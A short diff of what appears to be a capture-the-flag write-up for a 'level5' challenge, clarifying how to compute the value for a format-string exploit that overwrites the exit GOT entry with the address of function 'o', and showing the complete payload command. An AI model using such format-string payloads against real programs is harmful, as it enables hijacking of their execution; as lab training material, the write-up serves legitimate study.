@@ -50,7 +50,7 @@ the fourth position
 now lets convert the hex of the o function to decimal :
 
 80484a4=decimal>134513828
-we need to sub 4 bytes of the exit got address in the payload
+we need to sub 4 bytes of the exit got address from the decimal number in the payload
 so the final payload will be somthing like:
 
 (python -c "print('\x38\x98\x04\x08' + '%134513824u%4\$n')" ; cat) | ./level5
